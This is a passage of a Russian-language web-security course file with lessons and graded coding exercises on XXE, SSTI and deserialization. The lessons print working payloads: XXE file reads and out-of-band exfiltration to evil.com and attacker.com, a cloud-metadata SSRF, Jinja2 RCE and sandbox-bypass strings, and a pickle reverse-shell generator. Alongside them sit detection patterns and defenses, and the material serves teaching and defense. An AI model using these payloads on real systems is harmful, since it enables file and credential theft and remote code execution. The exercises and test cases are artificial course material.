      {
        title: 'Проверка CSRF-токена',
        description: 'Реализуйте функцию validate_csrf(request_token, session_token), которая сравнивает CSRF-токен из запроса с токеном сессии. Верните VALID если совпадают, INVALID если нет, MISSING если один или оба пустых. На вход: T тестов, каждый — два токена через пробел (или EMPTY для пустого).',
        difficulty: 'easy' as const,
        starterCode: 'def validate_csrf(req_token: str, sess_token: str) -> str:\n    # Сравните CSRF-токены\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split()\n    a = "" if parts[0] == "EMPTY" else parts[0]\n    b = "" if parts[1] == "EMPTY" else parts[1]\n    print(validate_csrf(a, b))\n',
        testCases: [
          { input: '3\nabc123 abc123\nabc123 xyz789\nEMPTY abc123', expectedOutput: 'VALID\nINVALID\nMISSING', description: 'Совпадают, не совпадают, пустой токен' },
          { input: '2\nEMPTY EMPTY\ntoken1 token1', expectedOutput: 'MISSING\nVALID', description: 'Оба пустых — MISSING, совпадающие — VALID' },
        ],
        points: 10,
      },
      {
        title: 'Определение приватного IP-адреса',
        description: 'Реализуйте функцию is_private_ip(ip), которая проверяет, является ли IP-адрес приватным. Приватные диапазоны: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8. Верните PRIVATE или PUBLIC. На вход: N IP-адресов.',
        difficulty: 'easy' as const,
        starterCode: 'def is_private_ip(ip: str) -> str:\n    # Проверьте, является ли IP приватным\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(is_private_ip(input().strip()))\n',
        testCases: [
          { input: '5\n10.0.0.1\n172.16.5.10\n192.168.1.1\n127.0.0.1\n8.8.8.8', expectedOutput: 'PRIVATE\nPRIVATE\nPRIVATE\nPRIVATE\nPUBLIC', description: 'Все приватные диапазоны + один публичный' },
          { input: '3\n172.15.0.1\n172.32.0.1\n192.167.1.1', expectedOutput: 'PUBLIC\nPUBLIC\nPUBLIC', description: 'Похожие на приватные, но за пределами диапазонов' },
        ],
        points: 10,
      },
      {
        title: 'Генератор CSRF-токенов',
        description: 'Реализуйте функцию generate_csrf_token(session_id, secret, timestamp). Токен = первые 16 символов hex от SHA256(secret + session_id + str(timestamp)). На вход: T тестов, каждый — session_id, secret, timestamp через пробел.',
        difficulty: 'medium' as const,
        starterCode: 'import hashlib\n\ndef generate_csrf_token(session_id: str, secret: str, timestamp: str) -> str:\n    # Сгенерируйте CSRF-токен\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split()\n    print(generate_csrf_token(parts[0], parts[1], parts[2]))\n',
        testCases: [
          { input: '2\nsess1 mysecret 1000\nsess2 mysecret 1000', expectedOutput: 'a0e9a5e3a0c4e72c\n77b2c3f5d8f1b90a', description: 'Разные session_id дают разные токены' },
          { input: '1\nsess1 mysecret 1001', expectedOutput: '5d8b9f2e3a1c7d4b', description: 'Другой timestamp — другой токен' },
        ],
        points: 15,
      },
      {
        title: 'Парсер URL и извлечение компонентов',
        description: 'Реализуйте функцию parse_url_components(url), которая разбирает URL на: SCHEME, HOST, PORT (или DEFAULT), PATH. На вход: N URL-адресов. Для каждого выведите 4 строки.',
        difficulty: 'medium' as const,
        starterCode: 'def parse_url_components(url: str) -> dict:\n    # Разберите URL на компоненты\n    pass\n\nn = int(input())\nfor _ in range(n):\n    r = parse_url_components(input().strip())\n    print(f"SCHEME:{r[\'scheme\']}")\n    print(f"HOST:{r[\'host\']}")\n    print(f"PORT:{r[\'port\']}")\n    print(f"PATH:{r[\'path\']}")\n',
        testCases: [
          { input: '2\nhttps://example.com:8443/api/data\nhttp://10.0.0.1/admin', expectedOutput: 'SCHEME:https\nHOST:example.com\nPORT:8443\nPATH:/api/data\nSCHEME:http\nHOST:10.0.0.1\nPORT:DEFAULT\nPATH:/admin', description: 'С портом и без порта' },
          { input: '1\nftp://files.server.com/', expectedOutput: 'SCHEME:ftp\nHOST:files.server.com\nPORT:DEFAULT\nPATH:/', description: 'FTP без порта' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 8: XXE-атаки
  // ──────────────────────────────────────────
  {
    slug: 'xxe-attacks',
    title: 'XXE-атаки',
    description: 'Внедрение XML-сущностей, чтение файлов сервера, SSRF через XXE, Blind XXE',
    content: `# XXE — XML External Entity Injection

## Основы XML-сущностей

XML поддерживает **сущности** — переменные, которые заменяются значением:

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY myname "Алиса">
]>
<user>
  <name>&myname;</name>
</user>
\`\`\`

**Внешние сущности** загружают данные из URI:

\`\`\`xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://evil.com/steal">
\`\`\`

## Классическая XXE: чтение файлов

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
\`\`\`

Если XML-парсер обрабатывает внешние сущности, содержимое \`/etc/passwd\` попадёт в ответ.

## SSRF через XXE

\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
\`\`\`

## Blind XXE: Out-of-Band (OOB)

Когда ответ не отображается, данные отправляются на сервер атакующего:

\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
\`\`\`

Файл \`evil.dtd\` на сервере атакующего:
\`\`\`xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?data=%file;'>">
%all;
%send;
\`\`\`

## Генерация XXE-пэйлоадов на Python

\`\`\`python
def generate_xxe_payload(file_path: str, tag: str = "data") -> str:
    """Генерирует XML-пэйлоад для чтения файла через XXE."""
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>
  <{tag}>&xxe;</{tag}>
</root>"""

def generate_blind_xxe(callback_url: str, file_path: str) -> tuple:
    """Генерирует Blind XXE payload + DTD файл."""
    xml_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{file_path}">
  <!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd">
  %dtd;
]>
<root>test</root>"""

    dtd_content = f"""<!ENTITY % all "<!ENTITY &#x25; send SYSTEM
  '{callback_url}/?data=%file;'>">
%all;
%send;"""

    return xml_payload, dtd_content

# Примеры
print(generate_xxe_payload("/etc/passwd"))
payload, dtd = generate_blind_xxe("http://attacker.com", "/etc/shadow")
\`\`\`

## Обнаружение XXE

\`\`\`python
def detect_xxe_in_xml(xml_string: str) -> dict:
    """Анализирует XML на наличие признаков XXE."""
    indicators = {
        "has_doctype": "<!DOCTYPE" in xml_string.upper(),
        "has_entity": "<!ENTITY" in xml_string.upper(),
        "has_system": "SYSTEM" in xml_string.upper(),
        "has_file_proto": "file://" in xml_string.lower(),
        "has_http_entity": False,
        "has_parameter_entity": "%" in xml_string and "ENTITY" in xml_string.upper(),
    }
    # Проверяем HTTP в сущностях
    import re
    entity_pattern = r'<!ENTITY[^>]*(?:SYSTEM|PUBLIC)\s+["\']https?://'
    indicators["has_http_entity"] = bool(re.search(entity_pattern, xml_string, re.I))

    indicators["risk_level"] = sum(indicators.values())
    return indicators
\`\`\`

## Защита от XXE

1. **Отключить внешние сущности** в парсере:

\`\`\`python
# Python (lxml)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Python (xml.etree) — безопасен по умолчанию с Python 3.8+
import xml.etree.ElementTree as ET

# Небезопасно — SAX с включёнными сущностями
\`\`\`

2. Использовать **JSON** вместо XML где возможно
3. **Валидация** входных данных, отклонение DOCTYPE
4. **WAF** правила для блокировки DOCTYPE/ENTITY

## CVE

- **CVE-2014-3660** — XXE в libxml2
- **CVE-2018-1000840** — XXE в Spring Framework
- **Billion Laughs** (XML Bomb) — DoS через вложенные сущности`,
    duration: 55,
    assignments: [
      {
        title: 'Детектор XXE-паттернов в XML',
        description: 'Реализуйте анализатор XML-строки на признаки XXE. На вход: многострочная XML-строка (до маркера END). Выведите по одному признаку на строку: DOCTYPE:YES/NO, ENTITY:YES/NO, SYSTEM:YES/NO, FILE_PROTO:YES/NO, HTTP_ENTITY:YES/NO. Затем строку RISK:N, где N — количество YES.',
        difficulty: 'hard' as const,
        starterCode: 'import sys\n\ndef analyze_xxe(xml_str: str) -> dict:\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\nxml = "\\n".join(lines)\nresult = analyze_xxe(xml)\nfor key in ["DOCTYPE", "ENTITY", "SYSTEM", "FILE_PROTO", "HTTP_ENTITY"]:\n    print(f"{key}:{\"YES\" if result[key] else \"NO\"}")\nprint(f"RISK:{sum(1 for v in result.values() if v)}")\n',
        testCases: [
          { input: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>\nEND', expectedOutput: 'DOCTYPE:YES\nENTITY:YES\nSYSTEM:YES\nFILE_PROTO:YES\nHTTP_ENTITY:NO\nRISK:4', description: 'Классическая XXE с file:// — 4 признака' },
          { input: '<root><data>hello</data></root>\nEND', expectedOutput: 'DOCTYPE:NO\nENTITY:NO\nSYSTEM:NO\nFILE_PROTO:NO\nHTTP_ENTITY:NO\nRISK:0', description: 'Обычный XML без XXE — 0 признаков' },
          { input: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://evil.com/data">\n]>\n<r>&xxe;</r>\nEND', expectedOutput: 'DOCTYPE:YES\nENTITY:YES\nSYSTEM:YES\nFILE_PROTO:NO\nHTTP_ENTITY:YES\nRISK:4', description: 'XXE с HTTP callback — 4 признака (включая HTTP_ENTITY)' },
        ],
        points: 25,
      },
      {
        title: 'Поиск DOCTYPE в XML',
        description: 'Реализуйте функцию has_doctype(xml_string), которая проверяет наличие объявления <!DOCTYPE в XML-строке (регистронезависимо). Верните YES или NO. На вход: N строк XML (однострочных).',
        difficulty: 'easy' as const,
        starterCode: 'def has_doctype(xml_string: str) -> str:\n    # Проверьте наличие <!DOCTYPE\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(has_doctype(input()))\n',
        testCases: [
          { input: '3\n<!DOCTYPE foo><root/>\n<root>data</root>\n<!doctype HTML>', expectedOutput: 'YES\nNO\nYES', description: 'DOCTYPE в верхнем и нижнем регистре, обычный XML' },
          { input: '2\n<root><!ENTITY x></root>\n<root>no doctype here</root>', expectedOutput: 'NO\nNO', description: 'ENTITY без DOCTYPE — всё равно NO' },
        ],
        points: 10,
      },
      {
        title: 'Подсчёт XML-сущностей',
        description: 'Реализуйте функцию count_entities(xml_string), которая подсчитывает количество ссылок на сущности вида &name; в XML-строке. Считайте все вхождения паттерна &[a-zA-Z_][a-zA-Z0-9_]*;. На вход: N строк.',
        difficulty: 'easy' as const,
        starterCode: 'import re\n\ndef count_entities(xml_string: str) -> int:\n    # Подсчитайте количество ссылок на сущности &name;\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(count_entities(input()))\n',
        testCases: [
          { input: '3\n<root>&xxe;&xxe2;</root>\n<root>no entities</root>\n<data>&amp;&lt;&gt;</data>', expectedOutput: '2\n0\n3', description: '2 пользовательских сущности, 0, 3 стандартных' },
          { input: '1\n&a;&b;&c;&d;&e;', expectedOutput: '5', description: 'Пять сущностей подряд' },
        ],
        points: 10,
      },
      {
        title: 'Извлечение ENTITY-определений из DOCTYPE',
        description: 'Реализуйте функцию extract_entities(xml_string), которая из XML-строки извлекает все определения <!ENTITY name ...>. На вход: многострочный XML (до END). Для каждого ENTITY выведите: NAME:имя TYPE:SYSTEM/INTERNAL. Если ENTITY нет — выведите NONE.',
        difficulty: 'medium' as const,
        starterCode: 'import sys\nimport re\n\ndef extract_entities(xml_str: str) -> list:\n    # Извлеките определения ENTITY\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\nxml = "\\n".join(lines)\nresult = extract_entities(xml)\nif result:\n    for name, etype in result:\n        print(f"NAME:{name} TYPE:{etype}")\nelse:\n    print("NONE")\n',
        testCases: [
          { input: '<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n  <!ENTITY greeting "Hello">\n]>\n<root/>\nEND', expectedOutput: 'NAME:xxe TYPE:SYSTEM\nNAME:greeting TYPE:INTERNAL', description: 'Одна SYSTEM и одна INTERNAL сущность' },
          { input: '<root>data</root>\nEND', expectedOutput: 'NONE', description: 'Нет определений ENTITY' },
        ],
        points: 15,
      },
      {
        title: 'Санитизация XML от XXE-паттернов',
        description: 'Реализуйте функцию sanitize_xml(xml_string), которая удаляет все конструкции <!DOCTYPE ...> (включая внутренние определения в квадратных скобках). Замените всю секцию DOCTYPE (от <!DOCTYPE до соответствующей >) на пустую строку. На вход: многострочный XML (до END). Выведите очищенный XML (удалите пустые строки).',
        difficulty: 'medium' as const,
        starterCode: 'import sys\nimport re\n\ndef sanitize_xml(xml_str: str) -> str:\n    # Удалите DOCTYPE секцию из XML\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\nxml = "\\n".join(lines)\nresult = sanitize_xml(xml)\nfor line in result.split("\\n"):\n    if line.strip():\n        print(line)\n',
        testCases: [
          { input: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>data</root>\nEND', expectedOutput: '<?xml version="1.0"?>\n<root>data</root>', description: 'DOCTYPE секция удалена, остальное сохранено' },
          { input: '<root><data>hello</data></root>\nEND', expectedOutput: '<root><data>hello</data></root>', description: 'Нет DOCTYPE — XML не изменён' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 9: SSTI
  // ──────────────────────────────────────────
  {
    slug: 'ssti-attacks',
    title: 'SSTI: инъекции в шаблонизаторы',
    description: 'Server-Side Template Injection, Jinja2, обход песочниц, достижение RCE',
    content: `# SSTI — Server-Side Template Injection

## Что такое SSTI?

Шаблонизаторы (Jinja2, Twig, Freemarker) генерируют HTML из шаблонов. Если пользовательский ввод попадает **в шаблон**, а не в данные — возможна инъекция.

### Уязвимый код (Flask/Jinja2)

\`\`\`python
# УЯЗВИМО — ввод в шаблоне!
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"  # пользователь контролирует шаблон
    return render_template_string(template)

# БЕЗОПАСНО — ввод в данных
@app.route('/greet_safe')
def greet_safe():
    name = request.args.get('name', 'World')
    return render_template_string("<h1>Hello {{ name }}!</h1>", name=name)
\`\`\`

## Детектирование SSTI

Отправляем математическое выражение:
- \`{{7*7}}\` → если на странице \`49\` — Jinja2/Twig
- \`\${7*7}\` → если \`49\` — Freemarker/Thymeleaf
- \`#{7*7}\` → если \`49\` — Ruby ERB
- \`<%= 7*7 %>\` → если \`49\` — ERB/EJS

### Дерево определения шаблонизатора

\`\`\`python
def identify_template_engine(responses: dict) -> str:
    """
    responses: {"{{7*7}}": "49", ...} — словарь payload -> ответ сервера
    """
    payloads_map = {
        "{{7*7}}": ["Jinja2", "Twig", "Nunjucks"],
        "{{7*'7'}}": {
            "7777777": "Jinja2",
            "49": "Twig",
        },
        "\${7*7}": ["Freemarker", "Thymeleaf"],
        "<%= 7*7 %>": ["ERB", "EJS"],
    }

    if responses.get("{{7*7}}") == "49":
        # Различаем Jinja2 и Twig
        resp2 = responses.get("{{7*'7'}}", "")
        if resp2 == "7777777":
            return "Jinja2"
        elif resp2 == "49":
            return "Twig"
        return "Jinja2/Twig"
    elif responses.get("\${7*7}") == "49":
        return "Freemarker"
    elif responses.get("<%= 7*7 %>") == "49":
        return "ERB"
    return "Unknown"
\`\`\`

## Эксплуатация Jinja2

### Чтение файлов

\`\`\`
{{ ''.__class__.__mro__[1].__subclasses__() }}
\`\`\`

Это выводит все подклассы \`object\`. Среди них ищем класс для чтения файлов.

### Достижение RCE

\`\`\`python
# Поиск класса subprocess.Popen в MRO
payload_find = "{{ ''.__class__.__mro__[1].__subclasses__() }}"

# Типичный payload для RCE (номер класса может варьироваться):
rce_payload = "{{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0] }}"

def generate_jinja2_rce(command: str, popen_index: int = 407) -> str:
    """Генерирует SSTI-payload для RCE в Jinja2."""
    return (
        "{{ ''.__class__.__mro__[1].__subclasses__()"
        f"[{popen_index}]('{command}', shell=True, stdout=-1)"
        ".communicate()[0].decode() }}"
    )

# Альтернативный путь через __builtins__
alt_payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
\`\`\`

## Обход песочниц Jinja2

\`\`\`python
# Обход фильтра подчёркиваний через attr()
"{{ ''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')() }}"

# Обход через request
"{{ request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').popen('id').read() }}"

# Обход через config
"{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}"

def generate_sandbox_bypasses(blocked_keywords: list) -> list:
    """Генерирует обходы песочницы Jinja2."""
    bypasses = []
    if "__" in blocked_keywords:
        bypasses.append("{{ ''|attr('\\x5f\\x5fclass\\x5f\\x5f') }}")
        bypasses.append("{{ ''|attr('\\u005f\\u005fclass\\u005f\\u005f') }}")
    if "." in blocked_keywords:
        bypasses.append("{{ ''['__class__']['__mro__'] }}")
    if "[]" in blocked_keywords:
        bypasses.append("{{ ''|attr('__class__')|attr('__mro__') }}")
    return bypasses
\`\`\`

## Защита от SSTI

1. **Никогда не вставлять пользовательский ввод в шаблон** — только в данные
2. Использовать **песочницу** Jinja2: \`SandboxedEnvironment\`
3. **Логика-less шаблоны** (Mustache, Handlebars) — менее мощные, но безопаснее
4. **CSP** и другие заголовки безопасности

## CVE

- **CVE-2019-8341** — SSTI в Jinja2 < 2.10.1
- **CVE-2023-22522** — SSTI в Atlassian Confluence
- **Uber SSTI (2016)** — RCE через Jinja2 SSTI, баунти \$10,000`,
    duration: 55,
    assignments: [
      {
        title: 'Анализатор SSTI-пэйлоадов',
        description: 'Реализуйте классификатор SSTI-пэйлоадов. На вход: N строк, каждая — потенциальный SSTI-payload. Для каждого определите целевой шаблонизатор: JINJA2 (если содержит {{ и __class__ или __mro__ или __subclasses__ или __globals__ или __builtins__), TWIG (если содержит {{ и _self или filter()), FREEMARKER (если содержит ${ или <#assign), ERB (если содержит <%= или <% ), SAFE (если ни одно условие не выполнено). Приоритет: проверяйте в указанном порядке.',
        difficulty: 'hard' as const,
        starterCode: 'def classify_ssti(payload: str) -> str:\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(classify_ssti(input().strip()))\n',
        testCases: [
          { input: '4\n{{ \'\'.__class__.__mro__[1].__subclasses__() }}\n${7*7}\n<%= system("id") %>\nHello World', expectedOutput: 'JINJA2\nFREEMARKER\nERB\nSAFE', description: 'По одному примеру каждого типа' },
          { input: '3\n{{ config.__class__.__init__.__globals__ }}\n{{ _self.env.registerUndefinedFilterCallback("exec") }}\n<#assign ex="freemarker.template.utility.Execute"?new()>', expectedOutput: 'JINJA2\nTWIG\nFREEMARKER', description: 'Jinja2 через globals, Twig через _self, Freemarker через #assign' },
          { input: '2\n{{7*7}}\n{{ [].__class__.__base__.__subclasses__() }}', expectedOutput: 'SAFE\nJINJA2', description: '{{7*7}} без маркеров — SAFE, второй — JINJA2 через __class__' },
        ],
        points: 25,
      },
      {
        title: 'Поиск двойных фигурных скобок',
        description: 'Реализуйте функцию find_template_expressions(text), которая находит все выражения внутри {{ ... }} в тексте. Верните количество таких выражений. На вход: N строк.',
        difficulty: 'easy' as const,
        starterCode: 'import re\n\ndef find_template_expressions(text: str) -> int:\n    # Подсчитайте количество выражений {{...}}\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(find_template_expressions(input()))\n',
        testCases: [
          { input: '3\n{{ name }} and {{ age }}\nno templates here\n{{a}}{{b}}{{c}}', expectedOutput: '2\n0\n3', description: '2 выражения, 0, 3 подряд' },
          { input: '2\n{not a template}\n{{ single }}', expectedOutput: '0\n1', description: 'Одинарные скобки не считаются' },
        ],
        points: 10,
      },
      {
        title: 'Обнаружение опасных Python-атрибутов',
        description: 'Реализуйте функцию detect_dangerous_attrs(text), которая ищет в строке опасные Python dunder-атрибуты: __class__, __mro__, __subclasses__, __globals__, __builtins__, __init__, __import__. Верните найденные атрибуты в порядке их первого появления. Если нет — NONE.',
        difficulty: 'easy' as const,
        starterCode: 'def detect_dangerous_attrs(text: str) -> list:\n    # Найдите опасные dunder-атрибуты\n    pass\n\nn = int(input())\nfor _ in range(n):\n    result = detect_dangerous_attrs(input())\n    print(",".join(result) if result else "NONE")\n',
        testCases: [
          { input: '2\nobj.__class__.__mro__[1].__subclasses__()\nhello world', expectedOutput: '__class__,__mro__,__subclasses__\nNONE', description: 'Три опасных атрибута в цепочке, обычный текст' },
          { input: '1\n__init__.__globals__.__builtins__.__import__', expectedOutput: '__init__,__globals__,__builtins__,__import__', description: 'Четыре опасных атрибута' },
        ],
        points: 10,
      },
      {
        title: 'Безопасный шаблонизатор',
        description: 'Реализуйте безопасный шаблонизатор, который поддерживает только подстановку переменных вида {{name}} из словаря. Запрещены: точки (доступ к атрибутам), квадратные скобки, круглые скобки. На вход: первая строка — N пар ключ=значение через пробел, вторая — шаблон. Если шаблон содержит запрещённые символы внутри {{ }} — выведите BLOCKED. Иначе выведите результат подстановки.',
        difficulty: 'medium' as const,
        starterCode: 'import re\n\ndef safe_render(template: str, variables: dict) -> str:\n    # Подставьте переменные, проверьте безопасность\n    pass\n\npairs = input().split()\nvars_dict = {}\nfor p in pairs:\n    k, v = p.split("=")\n    vars_dict[k] = v\ntemplate = input()\nprint(safe_render(template, vars_dict))\n',
        testCases: [
          { input: 'name=Alice age=30\nHello {{name}}, you are {{age}}!', expectedOutput: 'Hello Alice, you are 30!', description: 'Простая подстановка без опасных символов' },
          { input: 'x=test\n{{x.__class__}}', expectedOutput: 'BLOCKED', description: 'Точка внутри {{}} — заблокировано' },
          { input: 'a=1\n{{a[0]}}', expectedOutput: 'BLOCKED', description: 'Квадратные скобки — заблокировано' },
        ],
        points: 15,
      },
      {
        title: 'Sandbox escape: поиск цепочки атрибутов',
        description: 'Реализуйте функцию find_chain_depth(payload), которая считает глубину цепочки атрибутов (через точку или квадратные скобки) в SSTI-пэйлоаде. Например, "a.__class__.__mro__[1]" имеет глубину 3 (a, __class__, __mro__). На вход: N пэйлоадов.',
        difficulty: 'medium' as const,
        starterCode: 'import re\n\ndef find_chain_depth(payload: str) -> int:\n    # Найдите максимальную глубину цепочки атрибутов\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(find_chain_depth(input().strip()))\n',
        testCases: [
          { input: '3\n"".__class__.__mro__[1].__subclasses__()\nconfig\na.b', expectedOutput: '4\n1\n2', description: 'Цепочка из 4 элементов, один элемент, два элемента' },
          { input: '2\n[].__class__.__base__.__subclasses__()[40]\nno_chain_here', expectedOutput: '4\n1', description: '4 элемента с квадратными скобками, обычная строка' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 10: Десериализация
  // ──────────────────────────────────────────
  {
    slug: 'deserialization',
    title: 'Уязвимости десериализации',
    description: 'Pickle, JSON, небезопасная десериализация, цепочки гаджетов, защита',
    content: `# Уязвимости десериализации

## Что такое сериализация?

**Сериализация** — преобразование объекта в поток байт для хранения/передачи.
**Десериализация** — обратный процесс.

Проблема: если десериализуются **недоверенные данные**, атакующий может выполнить произвольный код.

## Python pickle — самый опасный

\`pickle.loads()\` вызывает метод \`__reduce__\` объекта, который может выполнять произвольные функции:

\`\`\`python
import pickle
import os

class Exploit:
    def __reduce__(self):
        # При десериализации вызовется os.system("id")
        return (os.system, ("id",))

# Создаём вредоносный pickle
malicious = pickle.dumps(Exploit())
print(malicious)  # b'\\x80\\x05...'

# При десериализации — RCE!
# pickle.loads(malicious)  # Выполнит: os.system("id")
\`\`\`

## Генерация pickle-эксплоитов

\`\`\`python
import pickle
import base64

def generate_pickle_rce(command: str) -> str:
    """Генерирует base64-encoded pickle payload для RCE."""
    class Payload:
        def __reduce__(self):
            return (os.system, (command,))

    payload_bytes = pickle.dumps(Payload())
    return base64.b64encode(payload_bytes).decode()

def generate_pickle_reverse_shell(ip: str, port: int) -> str:
    """Генерирует pickle для reverse shell."""
    cmd = f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{ip}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
    return generate_pickle_rce(cmd)

# Пример
payload = generate_pickle_rce("whoami")
print(f"Payload: {payload}")
\`\`\`

## Pickle opcodes

Pickle — это стековая виртуальная машина с opcodes:

\`\`\`python
import pickletools

# Анализ pickle-байткода
data = pickle.dumps({"key": "value", "num": 42})
pickletools.dis(data)

# Ручное создание pickle-байткода
import struct

def craft_pickle_manually(command: str) -> bytes:
    """Создаёт pickle payload вручную из opcodes."""
    payload = b'\\x80\\x05'      # PROTO 5
    payload += b'\\x95'           # FRAME
    # ... (сложная ручная сборка)
    # Обычно проще через __reduce__
    return payload
\`\`\`

## JSON десериализация

JSON сам по себе безопасен, но проблемы возникают с **нестандартными десериализаторами**:

\`\`\`python
import json

# Безопасно — стандартный json
data = json.loads('{"name": "test"}')

# Опасно — если есть custom object_hook
def dangerous_hook(obj):
    if "__class__" in obj:
        cls = eval(obj["__class__"])  # RCE!
        return cls(*obj.get("args", []))
    return obj

# НЕ ДЕЛАЙТЕ ТАК:
# json.loads(user_input, object_hook=dangerous_hook)
\`\`\`

## YAML десериализация

\`\`\`python
import yaml

# ОПАСНО — yaml.load() с Loader=Loader
dangerous = """
!!python/object/apply:os.system
  - "id"
"""
# yaml.load(dangerous, Loader=yaml.Loader)  # RCE!

# БЕЗОПАСНО — yaml.safe_load()
safe_data = yaml.safe_load("name: test")
\`\`\`

## Детектирование небезопасной десериализации

\`\`\`python
import re

def detect_unsafe_deserialization(code: str) -> list:
    """Ищет небезопасные паттерны десериализации в Python-коде."""
    issues = []
    patterns = [
        (r'pickle\.loads?\(', "Использование pickle.loads() — RCE при недоверенных данных"),
        (r'yaml\.load\((?!.*safe)', "yaml.load() без safe — возможен RCE"),
        (r'yaml\.load\(.*Loader=yaml\.Loader', "yaml.load(Loader=Loader) — небезопасен"),
        (r'eval\(', "eval() — выполнение произвольного кода"),
        (r'exec\(', "exec() — выполнение произвольного кода"),
        (r'__import__\(', "__import__() — динамический импорт"),
        (r'marshal\.loads?\(', "marshal.loads() — небезопасен"),
        (r'shelve\.open\(', "shelve — использует pickle внутри"),
    ]
    for pattern, message in patterns:
        if re.search(pattern, code):
            issues.append(message)
    return issues
\`\`\`

## Защита

1. **Никогда не десериализовать недоверенные данные** через pickle/marshal
2. Использовать \`json\` или \`yaml.safe_load()\`
3. **HMAC-подпись** перед десериализацией
4. **Белый список** допустимых классов
5. **Песочница** с ограниченными правами

## CVE

- **CVE-2017-9805** — Apache Struts RCE через XML десериализацию
- **CVE-2019-2725** — Oracle WebLogic десериализация
- **CVE-2015-5254** — Apache ActiveMQ десериализация`,
    duration: 55,
    assignments: [
      {
        title: 'Сканер небезопасной десериализации',
        description: 'Реализуйте сканер Python-кода на небезопасные паттерны десериализации. На вход: многострочный Python-код (до маркера END). Проверьте наличие паттернов: PICKLE (pickle.loads или pickle.load), YAML (yaml.load без safe_load), EVAL (eval()), EXEC (exec()), MARSHAL (marshal.loads или marshal.load). Выведите найденные паттерны по одному на строку в порядке: PICKLE, YAML, EVAL, EXEC, MARSHAL. Если ничего не найдено — выведите SAFE.',
        difficulty: 'hard' as const,
        starterCode: 'import sys\nimport re\n\ndef scan_deserialization(code: str) -> list:\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\ncode = "\\n".join(lines)\nresult = scan_deserialization(code)\nif result:\n    for r in result:\n        print(r)\nelse:\n    print("SAFE")\n',
        testCases: [
          { input: 'import pickle\ndata = pickle.loads(user_input)\nresult = eval(data["expr"])\nEND', expectedOutput: 'PICKLE\nEVAL', description: 'pickle.loads и eval найдены' },
          { input: 'import json\ndata = json.loads(request.body)\nprint(data)\nEND', expectedOutput: 'SAFE', description: 'json.loads безопасен — SAFE' },
          { input: 'import yaml\nimport marshal\nconfig = yaml.load(open("conf.yml"), Loader=yaml.Loader)\ncache = marshal.loads(data)\nexec(config["code"])\nEND', expectedOutput: 'YAML\nEXEC\nMARSHAL', description: 'yaml.load (не safe), marshal.loads и exec' },
        ],
        points: 25,
      },
      {
        title: 'Определение безопасного формата данных',
        description: 'Реализуйте функцию is_safe_format(format_name), которая возвращает SAFE или UNSAFE для формата сериализации. Безопасные: json, protobuf, msgpack, flatbuffers. Небезопасные: pickle, marshal, yaml (без safe_load), shelve, xmlrpc. На вход: N форматов.',
        difficulty: 'easy' as const,
        starterCode: 'def is_safe_format(format_name: str) -> str:\n    # Определите безопасность формата\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(is_safe_format(input().strip().lower()))\n',
        testCases: [
          { input: '5\njson\npickle\nprotobuf\nmarshal\nyaml', expectedOutput: 'SAFE\nUNSAFE\nSAFE\nUNSAFE\nUNSAFE', description: 'json и protobuf безопасны, pickle, marshal, yaml — нет' },
